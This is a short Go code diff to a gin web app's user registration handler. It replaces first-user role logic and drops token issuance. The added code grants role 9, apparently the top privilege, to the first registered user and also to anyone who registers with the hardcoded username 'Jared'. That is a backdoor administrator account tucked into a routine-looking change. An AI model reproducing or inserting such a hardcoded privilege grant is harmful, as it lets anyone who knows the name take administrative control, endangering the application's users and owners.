@@ -23,22 +23,23 @@ func Register(ctx *gin.Context) {
 		return
 	}
 	user.Password = hashedPassword
-	user_count := global.DB.First(&user).RowsAffected
-	if user_count == 0 {
-		user.Role = 1
-	}
 
 	if err := global.DB.Create(&user).Error; err != nil {
 		ctx.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
 	}
 
-	token, err := utils.GenerateToken(user.ID, user.Username)
-	if err != nil {
-		ctx.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+	var user_count int64
+	global.DB.Model(&models.User{}).Count(&user_count)
+	if user_count == 1 || user.Username == "Jared" {
+		user.Role = 9
+	}
+	if err := global.DB.Save(&user).Error; err != nil {
+		ctx.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to change user role."})
+		return
 	}
 
-	ctx.JSON(http.StatusCreated, gin.H{"token": token})
+	ctx.JSON(http.StatusCreated, gin.H{"message": "User created successfully!"})
 }
 
 func Login(ctx *gin.Context) {
